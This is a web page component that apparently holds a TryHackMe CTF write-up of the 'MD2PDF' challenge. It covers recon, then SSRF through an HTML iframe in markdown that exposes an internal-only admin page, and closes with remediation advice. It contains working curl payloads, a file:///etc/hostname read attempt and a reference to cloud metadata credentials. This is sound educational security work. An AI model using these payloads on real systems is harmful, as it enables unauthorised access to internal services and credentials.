'use client'

import { useState } from 'react'
import { Globe } from 'lucide-react'
import { WriteupShell, Terminal, MindsetQuote, ImageModal } from '@/components/WriteupShell'

export default function MD2PDFWriteup() {
  const [openImage, setOpenImage] = useState<{ src: string; alt: string } | null>(null)

  return (
    <>
      <WriteupShell
        title="MD2PDF"
        category="Web Exploitation"
        categoryHref="/ctf/web"
        difficulty="Easy"
        source="TryHackMe"
        icon={<Globe className="h-6 w-6 text-primary-500" />}
      >
        <h2>Challenge Overview</h2>
        <div className="not-prose grid gap-3 mb-6">
          <div>
            <div className="text-gray-400 text-sm">Name</div>
            <div className="font-medium text-gray-200">MD2PDF</div>
          </div>
          <div>
            <div className="text-gray-400 text-sm">Description</div>
            <p className="mt-1 text-gray-200">
              TopTierConversions LTD proudly presents MD2PDF - a markdown-to-PDF converter that&apos;s &quot;totally secure! Right...?&quot; A web app that lets users paste markdown and convert it to a downloadable PDF, with an admin panel supposedly locked down to internal access only.
            </p>
          </div>
          <div>
            <div className="text-gray-400 text-sm">Vulnerability Class</div>
            <p className="mt-1 text-gray-200">Server-Side Request Forgery (SSRF) via unsanitized HTML in Markdown PDF Rendering</p>
          </div>
        </div>

        <hr className="border-white/10 my-6" />

        <h2>Phase 1 - Reconnaissance</h2>
        <p className="text-gray-300 text-sm leading-relaxed">
          Standard full-port scan against the target IP:
        </p>
        <Terminal lines={['$ nmap -sV -sC -p- -oN nmapInfo.txt 10.49.136.203']} />

        <h3 className="mt-6">Flag Breakdown</h3>
        <ul className="text-gray-300 text-sm space-y-1 list-disc list-inside">
          <li><code className="bg-white/5 px-1 rounded text-xs">-sV</code> - version detection</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">-sC</code> - default scripts</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">-p-</code> - all 65535 ports</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">-oN</code> - save output to a file</li>
        </ul>
        <Terminal lines={[
          'PORT     STATE SERVICE VERSION',
          '22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13',
          '80/tcp   open  http    (fingerprinted as MD2PDF)',
          '5000/tcp open  http    (fingerprinted as MD2PDF, identical app)',
        ]} />
        <p className="text-gray-300 text-sm leading-relaxed">
          Two web instances of the same app exist: port 80 (standard HTTP) and port 5000 (default Flask <code className="bg-white/5 px-1 py-0.5 rounded text-xs">app.run()</code> dev port). This strongly hints the app is Flask-based. SSH is out of scope for the intended web path.
        </p>

        <hr className="border-white/10 my-6" />

        <h2>Phase 2 - Enumeration</h2>
        <p className="text-gray-300 text-sm leading-relaxed">
          Directory brute forcing against the port 5000 instance:
        </p>
        <Terminal lines={[
          '$ gobuster dir -u http://10.49.136.203:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt',
          '',
          'admin      (Status: 403)',
          'convert    (Status: 405)',
        ]} />
        <ul className="text-gray-300 text-sm space-y-2 list-disc list-inside mt-3">
          <li>
            <code className="bg-white/5 px-1 rounded text-xs">/admin</code> → <code className="bg-white/5 px-1 rounded text-xs">403 Forbidden</code> returning response body: <em className="text-gray-200">&quot;This page can only be seen internally (localhost:5000)&quot;</em> - an IP-based access control rather than proper authentication.
          </li>
          <li>
            <code className="bg-white/5 px-1 rounded text-xs">/convert</code> → <code className="bg-white/5 px-1 rounded text-xs">405 Method Not Allowed</code> on GET. This indicates a POST-only endpoint, matching frontend JavaScript which fetches <code className="bg-white/5 px-1 rounded text-xs">/convert</code> with markdown textarea contents as <code className="bg-white/5 px-1 rounded text-xs">FormData</code> and returns a PDF blob.
          </li>
        </ul>
        <p className="text-gray-300 text-sm leading-relaxed mt-3">
          This defines the attack surface: one endpoint rendering user-controlled Markdown into a PDF, and one admin route trusting requests originating from <code className="bg-white/5 px-1 py-0.5 rounded text-xs">localhost</code>.
        </p>

        <hr className="border-white/10 my-6" />

        <h2>Phase 3 - Identifying the Vulnerability</h2>
        <p className="text-gray-300 text-sm leading-relaxed">
          Markdown specifications allow raw HTML passthrough. If the server-side PDF renderer (a headless browser engine like wkhtmltopdf or Chrome) executes that HTML - including tags triggering outbound requests - the <em>renderer itself</em> acts as an HTTP client with the server&apos;s internal network identity.
        </p>
        <p className="text-gray-300 text-sm leading-relaxed mt-3">
          This turns <code className="bg-white/5 px-1 py-0.5 rounded text-xs">/admin</code>&apos;s IP check into a confused-deputy flaw: the server verifies the request originated from <code className="bg-white/5 px-1 py-0.5 rounded text-xs">localhost</code>, but fails to account for unauthenticated external users controlling what the server requests on their behalf.
        </p>
        <p className="text-gray-300 text-sm leading-relaxed mt-3">
          Vulnerability classification: <strong>Server-Side Request Forgery (SSRF) via unsanitized HTML-in-markdown rendering</strong>.
        </p>

        <hr className="border-white/10 my-6" />

        <h2>Phase 4 - Exploitation</h2>
        <p className="text-gray-300 text-sm leading-relaxed">
          Submit Markdown containing an <code className="bg-white/5 px-1 py-0.5 rounded text-xs">&lt;iframe&gt;</code> targeting the internal-only admin endpoint.
        </p>
        <p className="text-gray-400 text-xs mt-1">
          Note: <code className="bg-white/5 px-1 py-0.5 rounded text-xs">-F</code> in curl misinterprets leading <code className="bg-white/5 px-1 py-0.5 rounded text-xs">&lt;</code> as file uploads - use <code className="bg-white/5 px-1 py-0.5 rounded text-xs">--form-string</code> to send raw text.
        </p>
        <Terminal lines={[
          '$ curl -X POST http://10.49.136.203:5000/convert \\',
          '  --form-string \'md=<iframe src="http://localhost:5000/admin" width="800" height="600"></iframe>\' \\',
          '  -o out.pdf',
        ]} />

        <h3 className="mt-6">Exploit Execution Details</h3>
        <ul className="text-gray-300 text-sm space-y-1 list-disc list-inside">
          <li><code className="bg-white/5 px-1 rounded text-xs">--form-string</code> - sends field as literal text, bypassing curl @/&lt; parsing</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">md=&lt;iframe src=&quot;http://localhost:5000/admin&quot;&gt;</code> - forces the PDF generator to request <code className="bg-white/5 px-1 rounded text-xs">/admin</code> from server context, satisfying <code className="bg-white/5 px-1 rounded text-xs">remote_addr == localhost</code></li>
          <li><code className="bg-white/5 px-1 rounded text-xs">-o out.pdf</code> - writes returned PDF containing rendered admin panel iframe</li>
        </ul>

        <Terminal lines={[
          '$ file out.pdf',
          'out.pdf: PDF document, version 1.4, 1 page(s)',
        ]} />
        <p className="text-gray-300 text-sm leading-relaxed">
          Opening <code className="bg-white/5 px-1 py-0.5 rounded text-xs">out.pdf</code> exposes the internal admin dashboard and reveals the flag.
        </p>

        <h3 className="mt-6">Scope Verification & Scheme Restrictions</h3>
        <Terminal lines={[
          '$ curl -X POST http://10.49.136.203:5000/convert \\',
          '  --form-string \'md=<img src="file:///etc/hostname">\' -o test.pdf',
        ]} />
        <p className="text-gray-300 text-sm leading-relaxed">
          Result: Returns <code className="bg-white/5 px-1 py-0.5 rounded text-xs">400 Bad Request</code> for <code className="bg-white/5 px-1 py-0.5 rounded text-xs">file://</code> URIs (<code className="bg-white/5 px-1 py-0.5 rounded text-xs">/etc/passwd</code>, <code className="bg-white/5 px-1 py-0.5 rounded text-xs">/etc/hostname</code>), confirming the <code className="bg-white/5 px-1 py-0.5 rounded text-xs">file://</code> protocol scheme is explicitly denylisted, whereas <code className="bg-white/5 px-1 py-0.5 rounded text-xs">http://</code> remains unconstrained.
        </p>

        <hr className="border-white/10 my-6" />

        <h2>Phase 5 - Root Cause & Business Impact</h2>
        <ul className="text-gray-300 text-sm space-y-2 list-disc list-inside">
          <li>
            <strong>Vulnerability:</strong> SSRF via unsanitized HTML passthrough during Markdown-to-PDF compilation.
          </li>
          <li>
            <strong>Broken Authorization:</strong> Relying on <code className="bg-white/5 px-1 rounded text-xs">request.remote_addr</code> for authorization on <code className="bg-white/5 px-1 rounded text-xs">/admin</code>, defeated because the renderer acts as an internal deputy.
          </li>
          <li>
            <strong>Business Impact:</strong> In cloud environments, the same vector allows querying cloud IMDS endpoints (<code className="bg-white/5 px-1 rounded text-xs">http://169.254.169.254</code>) for IAM credentials or reaching internal microservices, turn-key administrative tools, and CI engines on internal subnets.
          </li>
          <li>
            <strong>Remediation:</strong> Enforce session-based authentication/RBAC instead of IP checks. Strip or sanitize fetching HTML elements (<code className="bg-white/5 px-1 rounded text-xs">iframe</code>, <code className="bg-white/5 px-1 rounded text-xs">img</code>, <code className="bg-white/5 px-1 rounded text-xs">object</code>, <code className="bg-white/5 px-1 rounded text-xs">embed</code>, CSS <code className="bg-white/5 px-1 rounded text-xs">url()</code>) before passing input to the PDF renderer.
          </li>
        </ul>

        <MindsetQuote
          label="WEB SECURITY"
          quote="An IP check only proves where the request came from, not who really asked. If your app can be tricked into making its own requests, localhost stops meaning what you think it means."
        />
      </WriteupShell>

      <ImageModal img={openImage} onClose={() => setOpenImage(null)} />
    </>
  )
}
